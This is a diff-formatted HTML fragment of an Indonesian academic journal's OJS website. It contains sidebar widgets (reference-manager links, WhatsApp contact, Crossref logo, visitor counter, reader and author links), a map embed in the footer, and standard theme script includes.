+<p><strong><a title="Unduh Zotero" href="https://www.zotero.org/download/" target="_blank" rel="noopener"><img src="https://jurnal.staipelitanusa.ac.id/public/site/images/adminthes/zotero-808cf59d895ad652bec28b51021cb42e.jpg" alt="" width="104" height="54"></a><a title="Mendeley" href="https://www.mendeley.com/download-reference-manager/windows" target="_blank" rel="noopener"><img src="/public/site/images/adminthes/logo-mendeley.png" width="66" height="53"></a></strong></p>
+<p><a title="WA" href="https://wa.me/message/WQTZ4S7YFLROI1" target="_blank" rel="noopener"><strong><img src="/public/site/images/adminthes/WA-Animasi.gif" width="221" height="57"></strong></a></p>
+</td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#208A0D" width="198"><span style="color: #ffffff;"><strong>Supported</strong></span></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#ffffff" width="198">
+<p><a title="RJI" href="https://doi.relawanjurnal.id/" target="_blank" rel="noopener"><img src="/public/site/images/adminthes/logoRJI-t.png"></a><br><a title="DOI Crossref" href="https://search.crossref.org/?from_ui=yes&amp;q=jurnal%20pelita%20nusa" target="_blank" rel="noopener"><img src="/public/site/images/adminthes/DOI_Crossref.png" width="319" height="81"></a></p>
+</td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#208A0D" width="198"><span style="color: #ffffff;"><strong>Visitor Statistic</strong></span></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#ffffff" width="198">
+<p>&nbsp;<a href="https://info.flagcounter.com/KjPf"><img src="https://s01.flagcounter.com/count2/KjPf/bg_FFFFFF/txt_000000/border_CCCCCC/columns_3/maxflags_15/viewers_0/labels_1/pageviews_1/flags_0/percent_0/" alt="Flag Counter" border="0"></a></p>
+</td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#208A0D" width="198"><span style="color: #ffffff;"><strong>Information</strong></span></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#ffffff" width="198">
+<div class="content">
+<ul>
+<li class="show"><a title="Readers" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/For_Readers" target="_blank" rel="noopener"> For Readers </a></li>
+<li class="show"><a title="Authors" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/For_Authors" target="_blank" rel="noopener"> For Authors </a></li>
+<li class="show"><a title="Librarians" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/For_Librarians" target="_blank" rel="noopener"> For Librarians</a></li>
+<li class="show"><a title="Unduh SK" href="https://drive.google.com/file/d/1b9AIp746KPfFPuUvUc4I8Ez2JTh2xF7K/view?usp=sharing" target="_blank" rel="noopener">Unduh SK JPN Management</a>&nbsp;</li>
+</ul>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+<p>&nbsp;</p>
+</div>
+</div>
+</div>
+	</div>
+</div>
+
+			</div><!-- pkp_sidebar.left -->
+			</div><!-- pkp_structure_content -->
+
+<div class="pkp_structure_footer_wrapper" role="contentinfo">
+	<a id="pkp_content_footer"></a>
+
+	<div class="pkp_structure_footer">
+
+					<div class="pkp_footer_content">
+				<p><iframe style="border: 0;" src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d15845.112239985847!2d107.4991296!3d-6.8572386!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2e68e51ab498be6d%3A0xee44a9b13ce0b711!2sSTAI%20Pelita%20Nusa%20Bandung%20Barat!5e0!3m2!1sen!2sid!4v1681876345732!5m2!1sen!2sid" width="600" height="450" allowfullscreen=""></iframe></p>
+			</div>
+		
+		<div class="pkp_brand_footer" role="complementary">
+			<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/about/aboutThisPublishingSystem">
+				<img alt="More information about the publishing system, Platform and Workflow by OJS/PKP." src="https://jurnal.staipelitanusa.ac.id/templates/images/ojs_brand.png">
+			</a>
+		</div>
+	</div>
+</div><!-- pkp_structure_footer_wrapper -->
+
+</div><!-- pkp_structure_page -->
+
+<script src="https://jurnal.staipelitanusa.ac.id/lib/pkp/lib/vendor/components/jquery/jquery.min.js?v=3.3.0.13" type="text/javascript"></script><script src="https://jurnal.staipelitanusa.ac.id/lib/pkp/lib/vendor/components/jqueryui/jquery-ui.min.js?v=3.3.0.13" type="text/javascript"></script><script src="https://jurnal.staipelitanusa.ac.id/plugins/themes/default/js/lib/popper/popper.js?v=3.3.0.13" type="text/javascript"></script><script src="https://jurnal.staipelitanusa.ac.id/plugins/themes/default/js/lib/bootstrap/util.js?v=3.3.0.13" type="text/javascript"></script><script src="https://jurnal.staipelitanusa.ac.id/plugins/themes/default/js/lib/bootstrap/dropdown.js?v=3.3.0.13" type="text/javascript"></script><script src="https://jurnal.staipelitanusa.ac.id/plugins/themes/default/js/main.js?v=3.3.0.13" type="text/javascript"></script>
+
+
+
+
+</body></html>
